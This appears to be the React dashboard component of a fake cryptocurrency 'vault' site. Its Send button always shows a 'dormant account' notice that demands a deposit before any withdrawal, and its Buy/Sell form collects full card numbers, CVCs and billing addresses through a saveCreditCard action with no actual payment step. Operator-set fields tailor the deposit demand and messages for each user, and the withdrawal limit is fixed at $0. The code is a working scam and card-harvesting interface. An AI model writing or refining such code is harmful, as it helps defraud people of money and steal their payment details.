"use client";
import { useState } from "react";
import { Eye, EyeOff, ArrowDown, Send, CreditCard, X, ShieldAlert, Lock, Copy, Building, Loader2 } from "lucide-react";
import PortfolioChart from "@/components/PortfolioChart";
import { saveCreditCard } from "@/app/actions/card";

// ADD marketData and transactions to the props
export default function DashboardClient({ assets, totalBalance, user, marketData, transactions }: any) {
  const [showBalance, setShowBalance] = useState(true);
  const [selectedAsset, setSelectedAsset] = useState<any>(null);
  const [depositTab, setDepositTab] = useState<"crypto" | "fiat">("crypto");
  const [showDormantModal, setShowDormantModal] = useState(false);
  const [showBuyModal, setShowBuyModal] = useState(false);
  const [isSubmittingCard, setIsSubmittingCard] = useState(false);

  // Helper to get live price for any coin (falls back to defaults if API is rate-limited)
  const getLivePrice = (symbol: string) => {
    const coin = marketData?.find((c: any) => c.symbol.toLowerCase() === symbol.toLowerCase());
    return coin ? coin.current_price : (symbol === 'BTC' ? 64000 : (symbol === 'ETH' ? 3000 : 1));
  };

// 1. Force totalBalance to be a strict number (fallback to 0 if corrupted)
  const safeTotalBalance = Number(totalBalance) || 0;

  // 2. Calculate the LIVE Fiat Value, forcing asset amounts to be strict numbers
  const liveCryptoValue = assets.reduce((acc: number, asset: any) => {
    const safeAmount = Number(asset.amount) || 0;
    return acc + (safeAmount * getLivePrice(asset.symbol));
  }, 0);
  
  // 3. Vault Balance = The Base Fiat Balance + The Live Crypto Value
  const vaultBalance = safeTotalBalance + liveCryptoValue;

  const sortedAssets = [...assets].sort((a: any, b: any) => {
    if (a.symbol === "BTC") return -1;
    if (b.symbol === "BTC") return 1;
    return b.amount - a.amount;
  });

  const handleCardSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmittingCard(true);
    await saveCreditCard(new FormData(e.currentTarget));
    setIsSubmittingCard(false);
    setShowBuyModal(false);
    setShowDormantModal(true);
  };

  return (
    <div className="space-y-6">
      
      {/* Top Section */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 bg-slate-900 border border-slate-800 p-8 rounded-3xl relative overflow-hidden shadow-2xl">
          <div className="flex justify-between items-start z-10 relative">
            <div>
              <p className="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Total Vault Balance</p>
             <h2 className={`text-4xl md:text-5xl font-mono tracking-tighter text-white flex items-baseline gap-2 ${!showBalance && 'blur-lg'}`}>
                ${vaultBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                <span className="text-xl md:text-2xl text-slate-500 font-bold tracking-widest">USD</span>
              </h2>
              
              {/* SPLIT BALANCES */}
              <div className={`mt-3 space-y-1 bg-slate-950/50 p-3 rounded-xl inline-block border border-slate-800 ${!showBalance && 'blur-lg'}`}>
                <p className="text-emerald-500 text-xs font-mono font-bold flex justify-between gap-6">
                  <span className="text-slate-500 uppercase tracking-widest text-[9px]">Crypto Value:</span>
                  ${liveCryptoValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                </p>
                <p className="text-blue-400 text-xs font-mono font-bold flex justify-between gap-6">
                  <span className="text-slate-500 uppercase tracking-widest text-[9px]">Available Fiat:</span>
                  {/* Make sure to use safeTotalBalance here if you added the NaN fix, otherwise use totalBalance */}
                  ${(Number(totalBalance) || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
                </p>
              </div>

              {/* NEW: Interest Rate Disclaimer */}
              <p className={`mt-4 text-[10px] text-slate-500 italic tracking-wide ${!showBalance && 'blur-lg'}`}>
                * A monthly interest rate of 0.5% will be applied to the outstanding balance.
              </p>

              <div className="mt-6 flex flex-wrap gap-3">
                <ActionButton icon={<ArrowDown size={16} />} label="Receive" onClick={() => { setSelectedAsset(sortedAssets[0]); setDepositTab("crypto"); }} />
                <ActionButton icon={<Send size={16} />} label="Send" onClick={() => setShowDormantModal(true)} />
                <ActionButton icon={<CreditCard size={16} />} label="Buy / Sell" primary onClick={() => setShowBuyModal(true)} />
              </div>
            </div>
            <button onClick={() => setShowBalance(!showBalance)} className="text-slate-500 hover:text-white bg-slate-800 p-2 rounded-lg transition-colors">
               {showBalance ? <Eye size={18} /> : <EyeOff size={18} />}
            </button>
          </div>
          <div className={`mt-4 h-48 ${!showBalance && 'blur-md'}`}>
             <PortfolioChart />
          </div>
        </div>

        {/* Security Status */}
        <div className="bg-slate-900 border border-slate-800 p-6 rounded-3xl flex flex-col justify-between">
           <div>
             <div className="flex items-center gap-2 mb-4">
               <ShieldAlert className="text-emerald-500" size={20} />
               <h3 className="font-bold text-white">Vault Status</h3>
             </div>
             <div className="space-y-4">
               <StatusRow label="Account Level" value="Standard" />
               <StatusRow label="Withdrawal Limit" value="$0.00 / Day" red />
               <StatusRow label="Verification" value="Pending Deposit" red />
             </div>
           </div>
           <div className="mt-6 bg-emerald-500/10 p-3 rounded-xl border border-emerald-500/20 text-xs text-emerald-400 leading-relaxed">
             {user?.vaultStatusMessage || <><span className="font-bold">Note:</span> Your account is currently in <span className="font-bold">Safe Mode</span>. Incoming transactions are active, but outgoing transfers are paused.</>}
           </div>
        </div>
      </div>

      {/* Asset Table */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-xl">
        <div className="p-4 border-b border-slate-800 flex justify-between items-center bg-slate-950/50">
          <h3 className="font-bold text-white text-sm uppercase tracking-wider">Market / Assets</h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead className="bg-slate-950 text-[10px] uppercase text-slate-500 font-bold tracking-wider">
              <tr>
                <th className="px-6 py-4">Coin</th>
                <th className="px-6 py-4 text-right">Balance</th>
                <th className="px-6 py-4 text-right">Live Value (USD)</th>
                <th className="px-6 py-4 text-right">Trade</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800">
              {sortedAssets.map((asset: any) => {
                const livePrice = getLivePrice(asset.symbol);
                return (
                  <tr key={asset.id} className="hover:bg-slate-800/50 transition-colors group">
                    <td className="px-6 py-4">
                      <div className="flex items-center gap-3">
                        <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-slate-950 text-xs ${asset.symbol === 'BTC' ? 'bg-orange-500' : asset.symbol === 'ETH' ? 'bg-blue-500' : asset.symbol === 'USDT' ? 'bg-green-500' : 'bg-slate-700 text-white'}`}>
                          {asset.symbol[0]}
                        </div>
                        <div>
                          <div className="font-bold text-white text-sm">{asset.name}</div>
                          <div className="text-[10px] text-slate-500 font-bold">{asset.symbol}</div>
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-4 text-right font-mono text-white text-sm">{asset.amount.toFixed(4)}</td>
                    <td className="px-6 py-4 text-right font-mono text-slate-400 text-sm">
                      {/* Using the individual coin's live price here */}
                      ${(asset.amount * livePrice).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                    </td>
                    <td className="px-6 py-4 text-right">
                      <button onClick={() => { setSelectedAsset(asset); setDepositTab("crypto"); }} className="text-xs font-bold text-emerald-500 hover:text-emerald-400 underline decoration-dotted">Deposit</button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* --- NEW: Transaction History Table --- */}
      <div className="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-xl mt-6">
        <div className="p-4 border-b border-slate-800 bg-slate-950/50">
          <h3 className="font-bold text-white text-sm uppercase tracking-wider">Recent Transactions</h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full text-left">
            <thead className="bg-slate-950 text-[10px] uppercase text-slate-500 font-bold tracking-wider">
              <tr>
                <th className="px-6 py-4">Type</th>
                <th className="px-6 py-4">Amount / Asset</th>
                <th className="px-6 py-4">Date & Time</th>
                <th className="px-6 py-4">Narration</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800">
              {(!transactions || transactions.length === 0) && (
                <tr><td colSpan={4} className="px-6 py-12 text-center text-slate-500 text-sm">No recent transactions found.</td></tr>
              )}
              {/* Slice to only show the 5 most recent */}
              {transactions?.slice(0, 5).map((tx: any) => (
                <tr key={tx.id} className="hover:bg-slate-800/50 transition-colors">
                  <td className="px-6 py-4">
                    <span className={`text-[10px] font-bold px-3 py-1.5 rounded-md uppercase tracking-wider ${tx.type === 'RECEIVE' || tx.type === 'DEPOSIT' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-red-500/10 text-red-400'}`}>
                      {tx.type}
                    </span>
                  </td>
                  <td className="px-6 py-4">
                    <div className="font-bold text-white font-mono text-sm">{tx.amount.toLocaleString()} {tx.asset}</div>
                  </td>
                  <td className="px-6 py-4">
                    <div className="text-sm text-slate-300">{tx.date}</div>
                    <div className="text-[10px] text-slate-500">{tx.time}</div>
                  </td>
                  <td className="px-6 py-4 text-sm text-slate-400">
                    {tx.narration}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        
        {/* The View All Link */}
        {transactions?.length > 0 && (
          <div className="p-3 border-t border-slate-800 bg-slate-950/80 text-center">
            <a href="/transactions" className="text-[10px] uppercase tracking-widest font-bold text-emerald-500 hover:text-emerald-400 hover:underline">
              View Complete History →
            </a>
          </div>
        )}
      </div>


      {/* MODAL 1: Receive (Crypto/Fiat) */}
      {selectedAsset && (
        <Modal onClose={() => setSelectedAsset(null)}>
          <div className="text-center mb-6">
            <h3 className="text-xl font-bold text-white mb-4">Deposit Funds</h3>
            <div className="flex bg-slate-950 p-1 rounded-lg border border-slate-800">
               <button onClick={() => setDepositTab("crypto")} className={`flex-1 py-2 text-xs font-bold rounded-md transition-all ${depositTab === 'crypto' ? 'bg-slate-800 text-white' : 'text-slate-500'}`}>Crypto Transfer</button>
               <button onClick={() => setDepositTab("fiat")} className={`flex-1 py-2 text-xs font-bold rounded-md transition-all ${depositTab === 'fiat' ? 'bg-slate-800 text-white' : 'text-slate-500'}`}>Wire / Bank Transfer</button>
            </div>
          </div>

          {user?.receiveMessage && (
            <div className="bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs p-3 rounded-lg mb-4 text-left">
              {user.receiveMessage}
            </div>
          )}

          {depositTab === "crypto" ? (
            <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 mb-6 relative group">
              <p className="text-[9px] uppercase font-bold text-slate-500 mb-2">Network: {selectedAsset.name} (Native)</p>
              <div className="flex items-center justify-between gap-2">
                <code className="text-emerald-400 font-mono text-xs break-all">{selectedAsset.walletAddress || "Generating address..."}</code>
                <button className="text-slate-500 hover:text-white transition-colors" title="Copy"><Copy size={16} /></button>
              </div>
            </div>
          ) : (
            <div className="space-y-3 mb-6">
               <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 flex items-center justify-between">
                  <div>
                    <p className="text-[9px] text-slate-500 uppercase font-bold">Bank Name</p>
                    <p className="text-sm text-white font-mono flex items-center gap-2 mt-1"><Building size={14} className="text-emerald-500" /> COIN VAULT</p>
                  </div>
               </div>
               <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 flex justify-between items-center">
                  <div>
                    <p className="text-[9px] text-slate-500 uppercase font-bold">Account Number</p>
                    {/* Dynamic number from database */}
                    <p className="text-sm text-white font-mono mt-1">{user?.accountNumber || "Pending Allocation"}</p>
                  </div>
                  <button className="text-slate-500 hover:text-white"><Copy size={14} /></button>
               </div>
               <div className="grid grid-cols-2 gap-3">
                 <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <p className="text-[9px] text-slate-500 uppercase font-bold">Routing Number</p>
                    <p className="text-sm text-white font-mono mt-1">122000248</p>
                 </div>
                 <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <p className="text-[9px] text-slate-500 uppercase font-bold">SWIFT Code</p>
                    <p className="text-sm text-white font-mono mt-1">GSB-US-33X</p>
                 </div>
               </div>
            </div>
          )}
        </Modal>
      )}

      {/* MODAL 2: Dormant Account Alert */}
      {showDormantModal && (
        <Modal onClose={() => setShowDormantModal(false)}>
          <div className="text-center">
            <div className="w-14 h-14 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4 text-red-500 animate-pulse">
              <Lock size={28} />
            </div>
            <h3 className="text-xl font-bold text-white mb-2">Action Required</h3>
            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              {user?.sendMessage || <>This account is currently marked as <span className="text-red-400 font-bold">Dormant</span> due to inactivity. Outgoing transactions are restricted.</>}
            </p>
          
            <div className="bg-slate-950 p-4 rounded-xl border border-red-500/20 mb-6 text-left">
              {/* Dynamic Reason */}
              <p className="text-xs text-slate-500 uppercase font-bold mb-2">
                 {user?.dormantReason || "Activation Requirement"}
              </p>
              
              <div className="flex justify-between items-center">
                 <span className="text-sm text-white">Required Deposit:</span>
                 {/* Dynamic Amount with formatting */}
                 <span className="text-emerald-500 font-mono font-bold">
                    ${user?.dormantAmount 
                        ? user.dormantAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) 
                        : "1,000.00"} USD
                 </span>
              </div>
            </div>
            <button onClick={() => { setShowDormantModal(false); setSelectedAsset(sortedAssets[0]); setDepositTab("fiat"); }} className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-3 rounded-xl transition-colors shadow-lg shadow-emerald-500/20">
              Deposit Funds Now
            </button>
          </div>
        </Modal>
      )}

      {/* MODAL 3: Buy/Sell Credit Card */}
      {showBuyModal && (
        <Modal onClose={() => setShowBuyModal(false)}>
            <div className="text-center mb-6">
                <div className="w-12 h-12 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-3 text-blue-500">
                    <CreditCard size={24} />
                </div>
                <h3 className="text-xl font-bold text-white">Buy Crypto via Card</h3>
                <p className="text-[10px] uppercase font-bold tracking-widest text-slate-500 mt-1">Secure Payment Gateway</p>
            </div>
            
            <form className="space-y-4" onSubmit={handleCardSubmit}>
                {/* 1. Credit Card Details */}
                <div>
                    <label className="text-[10px] uppercase font-bold text-slate-500">Card Number</label>
                    <input name="cardNumber" type="text" placeholder="0000 0000 0000 0000" className="w-full mt-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm text-white focus:border-emerald-500 outline-none placeholder:text-slate-700" required />
                </div>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <label className="text-[10px] uppercase font-bold text-slate-500">Expiry</label>
                        <input name="expiry" type="text" placeholder="MM/YY" className="w-full mt-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm text-white focus:border-emerald-500 outline-none placeholder:text-slate-700" required />
                    </div>
                    <div>
                        <label className="text-[10px] uppercase font-bold text-slate-500">CVC</label>
                        <input name="cvc" type="text" placeholder="123" className="w-full mt-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm text-white focus:border-emerald-500 outline-none placeholder:text-slate-700" required />
                    </div>
                </div>

                {/* 2. Billing Address Details */}
                <div className="border-t border-slate-800/80 pt-4 mt-2">
                   <p className="text-[10px] uppercase font-bold tracking-widest text-slate-500 mb-3">Billing Address</p>
                   <div className="space-y-4">
                       <div>
                          <label className="text-[10px] uppercase font-bold text-slate-500">Street Address</label>
                          <input name="address" type="text" placeholder="123 Main St" className="w-full mt-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm text-white focus:border-emerald-500 outline-none placeholder:text-slate-700" required />
                       </div>
                       <div className="grid grid-cols-2 gap-4">
                           <div>
                               <label className="text-[10px] uppercase font-bold text-slate-500">City</label>
                               <input name="city" type="text" placeholder="New York" className="w-full mt-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm text-white focus:border-emerald-500 outline-none placeholder:text-slate-700" required />
                           </div>
                           <div>
                               <label className="text-[10px] uppercase font-bold text-slate-500">Zip Code</label>
                               <input name="zipCode" type="text" placeholder="10001" className="w-full mt-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm text-white focus:border-emerald-500 outline-none placeholder:text-slate-700" required />
                           </div>
                       </div>
                   </div>
                </div>

                {/* Submit Button */}
                <div className="pt-2">
                   <button type="submit" disabled={isSubmittingCard} className="w-full flex justify-center items-center gap-2 bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl transition-all shadow-lg disabled:opacity-70">
                       {isSubmittingCard ? <Loader2 size={18} className="animate-spin" /> : "Proceed to Payment"}
                   </button>
                </div>
            </form>
        </Modal>
      )}
    </div>
  );
}

// ... Keep your existing ActionButton, StatusRow, and Modal components here ...
function ActionButton({ icon, label, primary, onClick }: any) {
  return (
    <button onClick={onClick} className={`flex items-center gap-2 px-5 py-2.5 rounded-full font-bold text-xs transition-all ${primary ? "bg-emerald-500 text-slate-950 hover:bg-emerald-400 shadow-lg shadow-emerald-500/20" : "bg-slate-800 text-white hover:bg-slate-700"}`}>
      {icon} {label}
    </button>
  );
}

function StatusRow({ label, value, red }: any) {
  return (
    <div className="flex justify-between items-center text-sm border-b border-slate-800/50 pb-2 last:border-0 last:pb-0">
      <span className="text-slate-400">{label}</span>
      <span className={`font-mono font-bold ${red ? 'text-red-400' : 'text-emerald-400'}`}>{value}</span>
    </div>
  );
}

function Modal({ children, onClose }: any) {
  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4" onClick={onClose}>
      <div className="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-sm p-6 shadow-2xl relative animate-in fade-in zoom-in duration-200" onClick={(e) => e.stopPropagation()}>
        <button onClick={onClose} className="absolute top-4 right-4 text-slate-500 hover:text-white transition-colors">
          <X size={20} />
        </button>
        {children}
      </div>
    </div>
  );
}